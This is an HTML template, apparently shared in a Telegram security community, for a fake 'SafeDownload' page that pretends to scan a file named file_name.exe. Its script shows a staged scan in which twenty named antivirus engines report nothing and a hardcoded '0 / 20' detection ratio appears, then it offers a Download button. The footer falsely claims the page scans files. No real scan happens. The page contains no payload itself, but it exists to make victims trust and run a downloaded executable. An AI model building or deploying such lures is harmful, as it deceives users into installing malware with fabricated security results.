<!-- This Script is provided for free from t.me/bigseccommunity & NOT FOR SALE -->
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width-device-width, initial scale=1.0">

    <title> SafeDownload </title>

    <link href="css/stylesheet.css" rel="stylesheet" type="text/css" />
    <link href="css/reset.css" rel="stylesheet" type="text/css" />

    <script language="javascript">
        function randomFromTo(from, to) {
            var numb = Math.floor(Math.random() * (to - from + 1) + from);
            return numb;
        }

        function todayDate() {
            var d = new Date();
            var YY = d.getFullYear().toString().substring(0, 4)
            d = d.toString().split(' ')
            var DD = Number(d[2]) < 10 ? '0' + d[2] : d[2];
            var MON = d[1].toUpperCase().replace(/,/g, '');
            var todayDate = DD + '-' + MON + '-' + YY;
            document.write('<div class="table-date">' + todayDate + '</div>');
        }


        function addLoadEvent(func) {
            var oldonload = window.onload;
            if (typeof window.onload != 'function') {
                window.onload = func;
            } else {
                window.onload = function() {
                    if (oldonload) {
                        oldonload();
                    }
                    func();
                }
            }
        }


        addLoadEvent(function() {

            var a1 = [1, 7, 14, 5, 13, 12, 16, 20, 2, 9, 3, 4, 19, 15, 8, 17, 10, 6, 11, 18];
            var a2 = [15, 12, 7, 3, 19, 16, 5, 18, 4, 8, 11, 10, 20, 13, 9, 1, 2, 6, 14, 17];
            var a3 = [5, 17, 4, 20, 15, 3, 2, 6, 18, 12, 9, 13, 14, 19, 10, 8, 7, 11, 16, 1];
            var a4 = [3, 7, 14, 6, 1, 10, 20, 17, 5, 11, 16, 18, 19, 4, 9, 2, 15, 12, 8, 13];
            var a5 = [17, 4, 3, 1, 13, 18, 12, 9, 20, 2, 15, 14, 8, 16, 19, 7, 11, 10, 5, 6];
            var a6 = [8, 9, 7, 6, 19, 14, 15, 2, 3, 4, 11, 12, 20, 13, 18, 5, 17, 10, 1, 16];
            var a7 = [2, 17, 15, 7, 4, 8, 16, 9, 20, 10, 1, 18, 11, 13, 6, 12, 5, 14, 3, 19];
            //func1(); 
            //func2();

            var t1 = setTimeout("document.getElementById('status').innerHTML=' <b> <img src=\"img/av-loading.gif\"> Analyzing... </b>'", 2500);
            var t2 = setTimeout("document.getElementById('status').innerHTML='<b>Scan finished</b>'", 10500);
            var t2 = setTimeout("document.getElementById('result1').innerHTML='Detection ratio: '", 10700);
            var t2 = setTimeout("document.getElementById('result2').innerHTML='<b><font color=\"#22cc22\">0 / 20</font></b>'", 10700);
            var t2 = setTimeout("document.getElementById('download').innerHTML='<a href=\"#\"> <div class=\"download-button\"> <p> Download </p> </div> </a>'", 10700);



            for (var i = 0; i < 20; i++) {
                var t1 = setTimeout("document.getElementById('" + a1[i] + "').innerHTML='<img src=\"img/avloading.gif\" width=\"95\" height=\"10\">'", randomFromTo(2500, 3500));
            }
            for (var i = 0; i < 20; i++) {
                var t1 = setTimeout("document.getElementById('" + a1[i] + "').innerHTML='<div class=\"found-nothing\"><img src=\"img/good.png\" /></div>'", randomFromTo(6000, 10000));
            }
        });
    </script>



</head>

<body>
    <!-- start of header -->
    <div id="header">
        <div id="logo">
        </div>
    </div>
    <!-- end of header -->

    <!-- start of content -->
    <div id="content">


        <div id="head">
            <h1> Your download is scanning and will be available shortly </h1>
        </div>

        <div id="scan-status">


            <!-- start of file-info-box-->
            <div id="file-info-box">
                <table cellspacing="5" class="scanner">
                    <tr valign="top">
                        <td>Status: </td>
                        <td id="status"><b>Requesting scan...</b></td>
                    </tr>
                    <tr valign="top">
                        <td>File name: </td>
                        <td> file_name.exe</td>
                    </tr>
                    <tr valign="top">
                        <td>Analysis date: </td>
                        <td><b>August 18 2021 13:10:11</b> (UTC)</td>
                    </tr>
                    <tr valign="top">
                        <td id="result1"></td>
                        <td id="result2"></td>
                    </tr>
                </table>
            </div>
            <!-- end of file-info-box -->

            <!-- start of download button -->
            <div id="download">

            </div>
            <!-- end of download button -->

        </div>

        <div id="table">
            <table class="waiting-for-scan" cellspacing="0">
                <thead>
                    <tr>
                        <th>
                            Antivirus
                        </th>
                        <th>
                            Date
                        </th>
                        <th>
                            Result
                        </th>
                    </tr>
                </thead>
                <tr height="24">
                    <td>
                        AVG
                    </td>
                    <td>
                        <script language="javascript">
                            todayDate();
                        </script>
                    </td>
                    <td id="1">
                        waiting for scan
                    </td>
                </tr>
                <tr>
                    <td></td>
                </tr>
                <tr>
                    <td>
                        Avast

                    </td>
                    <td>
                        <script language="javascript">
                            todayDate();
                        </script>
                    </td>
                    <td id="2">
                        waiting for scan
                    </td>
                </tr>
                <tr>

                    <td></td>
                </tr>
                <tr>
                    <td>
                        AntiVir
                    </td>
                    <td>
                        <script language="javascript">
                            todayDate();
                        </script>

                    </td>
                    <td id="3">
                        waiting for scan
                    </td>
                </tr>
                <tr>
                    <td></td>
                </tr>
                <tr>

                    <td>
                        BitDefender
                    </td>
                    <td>
                        <script language="javascript">
                            todayDate();
                        </script>
                    </td>
                    <td id="4">
                        waiting for scan
                    </td>

                </tr>
                <tr>
                    <td></td>
                </tr>
                <tr>
                    <td>
                        ByteHero
                    </td>
                    <td>

                        <script language="javascript">
                            todayDate();
                        </script>
                    </td>
                    <td id="5">
                        waiting for scan
                    </td>
                </tr>
                <tr>
                    <td></td>
                </tr>

                <tr>
                    <td>
                        ClamAV
                    </td>
                    <td>
                        <script language="javascript">
                            todayDate();
                        </script>
                    </td>
                    <td id="6">

                        waiting for scan
                    </td>
                </tr>
                <tr>
                    <td></td>
                </tr>
                <tr>
                    <td>
                        Dr.Web

                    </td>
                    <td>
                        <script language="javascript">
                            todayDate();
                        </script>
                    </td>
                    <td id="7">
                        waiting for scan
                    </td>
                </tr>
                <tr>

                    <td></td>
                </tr>
                <tr>
                    <td>
                        ESET-NOD32
                    </td>
                    <td>
                        <script language="javascript">
                            todayDate();
                        </script>

                    </td>
                    <td id="8">
                        waiting for scan
                    </td>
                </tr>
                <tr>
                    <td></td>
                </tr>
                <tr>

                    <td>
                        F-Prot
                    </td>
                    <td>
                        <script language="javascript">
                            todayDate();
                        </script>
                    </td>
                    <td id="9">
                        waiting for scan
                    </td>

                </tr>
                <tr>
                    <td></td>

                </tr>
                <tr>
                    <td>
                        F-Secure
                    </td>

                    <td>
                        <script language="javascript">
                            todayDate();
                        </script>
                    </td>
                    <td id="10">
                        waiting for scan
                    </td>
                </tr>
                <tr>
                    <td></td>

                </tr>
                <tr>
                    <td>
                        GData
                    </td>
                    <td>
                        <script language="javascript">
                            todayDate();
                        </script>
                    </td>

                    <td id="11">
                        waiting for scan
                    </td>
                </tr>
                <tr>
                    <td></td>
                </tr>
                <tr>
                    <td>

                        Ikarus
                    </td>
                    <td>
                        <script language="javascript">
                            todayDate();
                        </script>
                    </td>
                    <td id="12">
                        waiting for scan
                    </td>
                </tr>

                <tr>
                    <td></td>
                </tr>
                <tr>
                    <td>
                        Jiangmin
                    </td>
                    <td>
                        <script language="javascript">
                            todayDate();
                        </script>

                    </td>
                    <td id="13">
                        waiting for scan
                    </td>
                </tr>
                <tr>
                    <td></td>
                </tr>
                <tr>

                    <td>
                        Panda
                    </td>
                    <td>
                        <script language="javascript">
                            todayDate();
                        </script>
                    </td>
                    <td id="14">
                        waiting for scan
                    </td>

                </tr>
                <tr>
                    <td></td>
                </tr>
                <tr>
                    <td>
                        Quick Heal
                    </td>
                    <td>

                        <script language="javascript">
                            todayDate();
                        </script>
                    </td>
                    <td id="15">
                        waiting for scan
                    </td>
                </tr>
                <tr>
                    <td></td>
                </tr>

                <tr>
                    <td>
                        Sophos
                    </td>
                    <td>
                        <script language="javascript">
                            todayDate();
                        </script>
                    </td>
                    <td id="16">

                        waiting for scan
                    </td>
                </tr>
                <tr>
                    <td></td>
                </tr>
                <tr>
                    <td>
                        Symantec

                    </td>
                    <td>
                        <script language="javascript">
                            todayDate();
                        </script>
                    </td>
                    <td id="17">
                        waiting for scan
                    </td>
                </tr>
                <tr>

                    <td></td>
                </tr>
                <tr>
                    <td>
                        TrendMicro

                    </td>
                    <td>
                        <script language="javascript">
                            todayDate();
                        </script>
                    </td>
                    <td id="18">
                        waiting for scan
                    </td>
                </tr>
                <tr>

                    <td></td>
                </tr>

                <tr>
                    <td>
                        VBA32

                    </td>
                    <td>
                        <script language="javascript">
                            todayDate();
                        </script>
                    </td>
                    <td id="19">
                        waiting for scan
                    </td>
                </tr>
                <tr>

                    <td></td>
                </tr>

                <tr>
                    <td>
                        ViRobot

                    </td>
                    <td>
                        <script language="javascript">
                            todayDate();
                        </script>
                    </td>
                    <td id="20">
                        waiting for scan
                    </td>
                </tr>
                <tr>

                    <td></td>
                </tr>

            </table>
        </div>



    </div>
    <!-- end of content -->

    <!-- start of footer -->
    <div id="footer">

        <div class="footer-content">

            <p>
                SafeDownload is a free online service that enables you to scan files with several antivirus programs. </p>
            <br />
            <p>&copy;2021.&nbsp;All Rights Reserved.</p>

        </div>

    </div>
    <!-- end of footer -->
    <!-- end of footer -->
</body>

</html>